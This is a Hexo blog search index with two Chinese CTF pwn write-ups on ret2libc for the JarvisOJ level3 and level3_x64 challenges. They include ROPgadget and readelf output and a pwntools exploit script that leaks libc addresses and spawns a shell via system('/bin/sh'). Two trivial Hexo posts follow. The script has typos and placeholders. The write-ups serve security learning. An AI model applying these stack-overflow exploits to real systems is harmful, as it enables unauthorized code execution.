<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>x64的ret2libc—bc_x64传参和构造payload</title>
      <link href="/2019/07/24/x64%E7%9A%84ret2libc%E2%80%94bc-x64%E4%BC%A0%E5%8F%82%E5%92%8C%E6%9E%84%E9%80%A0payload/"/>
      <url>/2019/07/24/x64%E7%9A%84ret2libc%E2%80%94bc-x64%E4%BC%A0%E5%8F%82%E5%92%8C%E6%9E%84%E9%80%A0payload/</url>
      
        <content type="html"><![CDATA[<p>​        对于x64的题目来说，与x32相比最大的不同在于传参方式的不同，x32位函数调用是通过栈来传递参数的，而x64位的是通过寄存器来传递参数的。所以在做x64题目的时候，构造的payload必须要注意这些区别。</p><hr><blockquote><p>64位函数<strong>需要使用寄存器传参</strong>,前三个参数存放在rdi，rsi，rdx中</p></blockquote><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>​        以JarvisOJ 中的level3_x64为例子，给了libc.so库文件</p><p>[]: <a href="https://dn.jarvisoj.com/challengefiles/level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de</a></p><hr><p>​        打开后发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        很明显的危险函数read() 发生栈溢出，溢出大小为0x80。shift+F12查看string没有发现“/bin/sh”.猜测和level3的思路差不多，具体不再赘述，详情在</p><p>[]: <a href="https://l1ya0.github.io/2019/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ret2libc/" target="_blank" rel="noopener">https://l1ya0.github.io/2019/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ret2libc/</a></p><p>​        因为使用write函数有三个参数，所以构造第一个payload来泄露read的真正地址时需要由三个寄存器rdi，rsi，rdx来存放参数，但是我们只搜索到了rdi和rsi：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3_x64$ ROPgadget --binary level3_x64 --only <span class="string">"pop|ret"</span> | grep <span class="string">"rdi"</span></span><br><span class="line"><span class="number">0x00000000004006b3</span> : pop rdi ; ret</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3_x64$ ROPgadget --binary level3_x64 --only <span class="string">"pop|ret"</span> | grep <span class="string">"rsi"</span></span><br><span class="line"><span class="number">0x00000000004006b1</span> : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>​        没有rdx该怎么办呢？</p><p>网上有几种理解</p><blockquote><p>如果我们不设置 rdx寄存器的值的话 , 那在 write() 调用的时候就会直接取得 rdx 之前的值<br>我们可以考虑一下 , 我们这里只需要获取 write() 返回的前八个字节作为地址<br>那么就算打印的数据较多 , 也并不会影响什么 , 只需要能保证 rdx 寄存器的值大于 8 即可<br>经过调试发现这里 rdx 的值确实是大于 8 的 , 这样我们就只需要接收前八个字节作为地址即可</p><blockquote><p>作者：王一航 链接：<a href="https://www.jianshu.com/p/03a49c53c5c3" target="_blank" rel="noopener">https://www.jianshu.com/p/03a49c53c5c3</a> 来源：简书</p></blockquote></blockquote><hr><blockquote><p>根据我们对write函数的了解，最后一个参数是用来控制长度的，所以，只要rdx寄存器的长度大于0x8就没有问题：<br>我们看一下：<br><img src="http://img.wandouip.com/crawler/article/201979/12e6a330b53824e8dba044c905403625" alt="img"><br>我们通过GDB查看一下，运行时，rdx的值为0x200，这是完全足够的，我们就不需要控制他并对其赋值了。</p><blockquote><p>链接：<a href="https://www.wandouip.com/t5i368416/" target="_blank" rel="noopener">https://www.wandouip.com/t5i368416/</a></p></blockquote></blockquote><hr><blockquote><p>根据网上wp，gdb在read处下断，验证rdx在此时等于0x200，只要大于8就可以。对于这点，我是这么理解的：我们是在vul函数里写入数据的，读取数据时调用了read(0, &amp;buf, 0x200uLL)，将rdx赋值0x200，后面直接就溢出到我们构造的栈了，没有修改rdx寄存器的值了，所以不用修改。</p><blockquote><p> 作者：发蝴蝶和大脑斧 来源：CSDN 原文：<a href="https://blog.csdn.net/weixin_41617275/article/details/84843638" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41617275/article/details/84843638</a> </p></blockquote></blockquote><p>​        我偏向于第三种解释。因为在IDA里我们就发现了read(0, &amp;buf, 0x200uLL);他开辟的空间是0x200，远大于我们需要的8字节。所以我们不需要修改寄存器的值。</p><p>​        由此传参问题已经解决了。</p><hr><h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><p>​        x64位的payload构造方法和x32的不同。x32位的是 溢出字符+函数地址+返回地址+函数参数1+函数参数2</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最简单的ret2libc</title>
      <link href="/2019/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ret2libc/"/>
      <url>/2019/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ret2libc/</url>
      
        <content type="html"><![CDATA[<p>​        对于我来说ret2libc还是比较难懂的一块东西，借着师兄的学习资料，总算对ret2libc有了一点深刻的了解。</p><hr><h3 id="主要思想"><a href="#主要思想" class="headerlink" title="主要思想"></a>主要思想</h3><p>​        ret2libc这一类的题目一般会给你一个题目文件和一个libc库文件。如libc.so。libc.so里存放的是程序编译的所有函数，而解题的主要思想就是借助libc.so里各个函数之间的相对地址和程序的是相同的这一特性。libc库中的函数和主函数中的函数，其地址的差值就是所谓的offset。如果知道了这个offset和任意libc中的函数A地址，你就知道了A在主函数中的地址。</p><hr><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -a ./libc.so | grep <span class="string">"function@"</span>     <span class="comment">#在libc.so里查找function函数地址</span></span><br><span class="line">strings -a -t x ./libc.so | grep <span class="string">"/bin/sh"</span>  <span class="comment">#在libc.so里查找字符串”/bin/sh“地址</span></span><br></pre></td></tr></table></figure><hr><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>​        JarvisOJ中的level3。打开后发现</p><p><img src="C:%5CUsers%5C13953%5CDesktop%5C%E6%8D%95%E8%8E%B7.PNG" alt></p><p>read()是一个明显的栈溢出漏洞函数（gets()，puts()等也是）。</p><p>使用上面提到的工具：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep <span class="string">"system"</span></span><br><span class="line">   <span class="number">243</span>: <span class="number">0011</span>b8a0    <span class="number">73</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> svcerr_systemerr@@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">620</span>: <span class="number">00040310</span>    <span class="number">56</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  <span class="number">1443</span>: <span class="number">00040310</span>    <span class="number">56</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> system@@GLIBC_2<span class="number">.0</span></span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep <span class="string">"read@"</span></span><br><span class="line">   <span class="number">571</span>: <span class="number">000</span>dd3e0   <span class="number">125</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> __read@@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">705</span>: <span class="number">0006</span>f230    <span class="number">50</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _IO_file_read@@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">950</span>: <span class="number">000</span>dd3e0   <span class="number">125</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> read@@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">1166</span>: <span class="number">000e30</span>f0  <span class="number">1461</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> fts_read@@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">1263</span>: <span class="number">000</span>ee840    <span class="number">46</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> eventfd_read@@GLIBC_2<span class="number">.7</span></span><br><span class="line">  <span class="number">1698</span>: <span class="number">000643</span>a0   <span class="number">259</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> fread@@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">2181</span>: <span class="number">000</span>c5690   <span class="number">204</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> pread@@GLIBC_2<span class="number">.1</span></span><br><span class="line">  <span class="number">2300</span>: <span class="number">000643</span>a0   <span class="number">259</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _IO_fread@@GLIBC_2<span class="number">.0</span></span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep <span class="string">"write@"</span></span><br><span class="line">   <span class="number">108</span>: <span class="number">0006</span>c410   <span class="number">323</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _IO_wdo_write@@GLIBC_2<span class="number">.2</span></span><br><span class="line">   <span class="number">182</span>: <span class="number">000</span>dd460   <span class="number">125</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> __write@@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">306</span>: <span class="number">0012</span>a880    <span class="number">45</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _IO_do_write@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">307</span>: <span class="number">0006</span>fcc0    <span class="number">45</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _IO_do_write@@GLIBC_2<span class="number">.1</span></span><br><span class="line">  <span class="number">1330</span>: <span class="number">000</span>c5760   <span class="number">204</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> __libc_pwrite@@GLIBC_PRIVATE</span><br><span class="line">  <span class="number">1677</span>: <span class="number">000</span>ee870    <span class="number">62</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> eventfd_write@@GLIBC_2<span class="number">.7</span></span><br><span class="line">  <span class="number">1692</span>: <span class="number">000647</span>f0   <span class="number">372</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> fwrite@@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">2140</span>: <span class="number">0012</span>a2d0   <span class="number">108</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _IO_file_write@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">2144</span>: <span class="number">0006</span>ecf0   <span class="number">131</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _IO_file_write@@GLIBC_2<span class="number">.1</span></span><br><span class="line">  <span class="number">2165</span>: <span class="number">000647</span>f0   <span class="number">372</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _IO_fwrite@@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">2186</span>: <span class="number">000</span>c5760   <span class="number">204</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> pwrite@@GLIBC_2<span class="number">.1</span></span><br><span class="line">  <span class="number">2303</span>: <span class="number">000</span>dd460   <span class="number">125</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> write@@GLIBC_2<span class="number">.0</span></span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf-a libc.so | grep <span class="string">"exit@"</span></span><br><span class="line">readelf-a：未找到命令</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep <span class="string">"exit@"</span></span><br><span class="line">   <span class="number">111</span>: <span class="number">00033690</span>    <span class="number">58</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> __cxa_at_quick_exit@@GLIBC_2<span class="number">.10</span></span><br><span class="line">   <span class="number">139</span>: <span class="number">00033260</span>    <span class="number">45</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> exit@@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">554</span>: <span class="number">000</span>b8634    <span class="number">24</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> _exit@@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">609</span>: <span class="number">0011e780</span>    <span class="number">56</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> svc_exit@@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">645</span>: <span class="number">00033660</span>    <span class="number">45</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> quick_exit@@GLIBC_2<span class="number">.10</span></span><br><span class="line">   <span class="number">868</span>: <span class="number">00033490</span>    <span class="number">84</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> __cxa_atexit@@GLIBC_2<span class="number">.1</span><span class="number">.3</span></span><br><span class="line">  <span class="number">1037</span>: <span class="number">00128</span>ce0    <span class="number">60</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> atexit@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">1492</span>: <span class="number">000</span>fb610    <span class="number">62</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> pthread_exit@@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">2243</span>: <span class="number">00033290</span>    <span class="number">77</span> FUNC    WEAK   DEFAULT   <span class="number">12</span> on_exit@@GLIBC_2<span class="number">.0</span></span><br><span class="line">  <span class="number">2386</span>: <span class="number">000</span>fc180     <span class="number">2</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> __cyg_profile_func_exit@@GLIBC_2<span class="number">.2</span></span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ strings -a -t x libc.so |grep <span class="string">"/bin/sh"</span></span><br><span class="line"> <span class="number">162</span>d4c /bin/sh</span><br></pre></td></tr></table></figure><hr><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("")</span></span><br><span class="line">p=process(<span class="string">"./level3"</span>)</span><br><span class="line">e=ELF(<span class="string">"./level3"</span>)</span><br><span class="line">plt_write=hex(e.plt[<span class="string">'write'</span>])</span><br><span class="line">got_read=hex(e.got[<span class="string">'read'</span>])</span><br><span class="line">vulneradr=hex(e.symbols[<span class="string">'vulnerable_function'</span>])</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'aaaa'</span>+p32(int(plt_write,<span class="number">16</span>))+p32(int(vulneradr,<span class="number">16</span>))+p32(<span class="number">1</span>)+p32(int(got_read,<span class="number">16</span>))+p32(<span class="number">4</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">readadr=hex(u32(p.recv(<span class="number">4</span>))<span class="comment">#read's real address</span></span><br><span class="line">print(<span class="string">'readadr='</span>+readar)</span><br><span class="line">libcread=<span class="number">0x000dd3e0</span></span><br><span class="line">libc_base=int(readadr,<span class="number">16</span>)-libcread<span class="comment">#offset of libc and main</span></span><br><span class="line">sysadr=libc_base+xxxx</span><br><span class="line">exitadr=libc_base+xxxx</span><br><span class="line">binshadr=libc_base+xxxx<span class="comment">#xxxx都可以用上面给的工具通过libc库得到</span></span><br><span class="line">paylaod1=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'aaaa'</span>+p32(sysadr)+p32(exitadr)+p32(binshadr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><p>​        我们知道</p><blockquote><p>plt表中存放的got表的地址，got表中存放的是函数的真实地址</p></blockquote><p>​        首先我们得到write的plt表值，read的got表值（got表存放的是read函数的真实地址），以及read函数所在的vulnerable_function的地址。然后我们就开始可以构造第一个payload来泄露read啊函数的真实地址了，前面的是0x88的泄露点和32位的部分，最后三个则是write函数所需的参数，vulenr函数是返回地址，即调用vunler函数和write函数来输出read函数的真实地址。知道了read的真实地址之后我们就可以构造offset了，使用readelf命令读取libc.so文件中的地址。</p><p>​        libc_base=readadr-libc_read_offset（read函数的真实地址-read函数的libc地址）</p><p>​        libc_function_function_offset通常可以使用readelf来得到</p><blockquote><p>libc_base = real_function_addr - libc_function_offset</p><p>real_function_addr=libc_base+libc_function_offset</p></blockquote><p>最后根据offset和各函数的地址就可以做出来了，”bin/sh”的地址可以用strings的命令得到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次搭建博客</title>
      <link href="/2019/07/17/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/07/17/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>第一次搭建博客</p><p>有点简陋但是是自己一步一步摸索出来的</p><p>加油啊 !</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/07/17/hello-world/"/>
      <url>/2019/07/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="put-the-local-files-on-the-Github"><a href="#put-the-local-files-on-the-Github" class="headerlink" title="put the local files on the Github"></a>put the local files on the Github</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure><p>More info:None</p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><h3 id="生成dexo"><a href="#生成dexo" class="headerlink" title="生成dexo"></a>生成dexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate <span class="comment"># or hexo g</span></span><br></pre></td></tr></table></figure><h3 id="部署dexo"><a href="#部署dexo" class="headerlink" title="部署dexo"></a>部署dexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy <span class="comment"># or hexo d</span></span><br></pre></td></tr></table></figure><p>More info:None</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
